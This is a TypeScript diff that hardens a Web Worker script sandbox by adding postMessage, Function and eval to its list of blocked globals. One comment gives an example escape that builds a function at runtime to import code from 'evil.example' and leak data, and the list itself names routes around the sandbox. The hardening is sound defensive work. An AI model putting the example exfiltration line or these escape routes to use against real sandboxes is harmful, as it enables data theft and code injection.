@@ -15,6 +15,22 @@ const BLOCKED_GLOBALS = [
   "indexedDB",
   "caches",
   "Notification",
+  // The worker's own back-channel to the host — otherwise reachable by a user script exactly the
+  // same way every other ambient global here is (it's a plain identifier in the Worker's global
+  // scope, not something `new Function(...params...)` scopes away), letting a script forge its
+  // own fake ScriptRunResult (crashing the host's own onmessage handler, or flooding it) instead
+  // of ever going through runScript.ts's real return value. scriptWorkerEntry.ts captures the
+  // real one under a different name *before* this lockdown runs, for its own legitimate one
+  // postMessage-per-run.
+  "postMessage",
+  // Neither is a route to more code the way importScripts/Worker are exactly, but each is a route
+  // *around* every restriction above: a script could otherwise build and run a brand new function
+  // at runtime — e.g. Function("return import('https://evil.example/?d='+leak)")() — that never
+  // appears anywhere in its own literal source text, or use direct/indirect eval the same way.
+  // runScript.ts itself captures the real Function constructor under a different name *before*
+  // this lockdown runs, for its own one `new Function(scriptCode)` compile step.
+  "Function",
+  "eval",
 ] as const;
 
 /** Overrides `name` on `target` with a function that always throws, via `Object.defineProperty`
